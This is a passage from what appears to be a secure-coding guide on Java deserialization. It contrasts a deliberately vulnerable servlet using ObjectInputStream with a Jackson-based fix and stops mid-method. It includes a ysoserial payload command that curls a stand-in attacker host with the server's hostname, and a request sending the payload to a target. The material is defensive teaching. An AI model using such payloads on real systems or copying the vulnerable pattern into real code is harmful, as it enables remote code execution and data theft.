Using `ObjectInputStream` directly on untrusted data is extremely dangerous and has been the root cause of some of the most severe vulnerabilities in Java history. Deserialization attacks allow attackers to execute arbitrary code on your server simply by sending a crafted payload.

**VULNERABLE CODE**:

```java
import java.io.*;
import javax.servlet.http.*;
import javax.servlet.*;
import java.util.Base64;

public class UserSessionServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        // VULNERABLE: Deserializing untrusted user input
        String sessionData = request.getParameter("session");

        if (sessionData != null) {
            byte[] data = Base64.getDecoder().decode(sessionData);
            ByteArrayInputStream bis = new ByteArrayInputStream(data);
            ObjectInputStream ois = new ObjectInputStream(bis);

            try {
                // DANGER: This executes attacker code during deserialization
                UserSession session = (UserSession) ois.readObject();
                request.getSession().setAttribute("userSession", session);
                response.getWriter().println("Session restored for: " + session.getUsername());
            } catch (ClassNotFoundException e) {
                response.sendError(500, "Session error");
            } finally {
                ois.close();
            }
        }
    }
}
```

**Attack Payload** (generated with ysoserial):
```bash
# Generate malicious serialized object using ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned?host=$(hostname)' | base64

# Send to vulnerable endpoint
curl -X POST http://target.com/session \
  -d "session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpE..." 
```

**Why This Is Dangerous**:
- Java deserialization executes code BEFORE the cast to UserSession happens
- Gadget chains in common libraries (Commons Collections, Spring, etc.) enable RCE
- Attacker gains complete control of the server with application privileges
- The vulnerable pattern appears in cookies, HTTP headers, JMX, RMI, and message queues

**SECURE VERSION**:

```java
import java.io.*;
import javax.servlet.http.*;
import javax.servlet.*;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import java.util.logging.Logger;

public class SecureUserSessionServlet extends HttpServlet {
    private static final Logger logger = Logger.getLogger(SecureUserSessionServlet.class.getName());
    private static final ObjectMapper objectMapper;

    static {
        objectMapper = new ObjectMapper();
        // Disable polymorphic deserialization to prevent type confusion attacks
        objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
        objectMapper.deactivateDefaultTyping();
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        String sessionJson = request.getParameter("session");

        if (sessionJson == null || sessionJson.length() > 10000) {
            logger.warning("Invalid session data from: " + request.getRemoteAddr());
            response.sendError(400, "Invalid request");
            return;
        }

        try {
            // SECURE: Use JSON deserialization with explicit type binding
            UserSessionDTO session = objectMapper.readValue(sessionJson, UserSessionDTO.class);

            // Additional validation
            if (!isValidSession(session)) {
                logger.warning("Session validation failed for: " + request.getRemoteAddr());
                response.sendError(403, "Invalid session");
                return;
            }

            request.getSession().setAttribute("userSession", session);
            response.getWriter().println("Session restored successfully");

        } catch (Exception e) {
            logger.severe("Session parsing error: " + e.getClass().getName());
            response.sendError(400, "Invalid session format");
        }
    }

    private boolean isValidSession(UserSessionDTO session) {
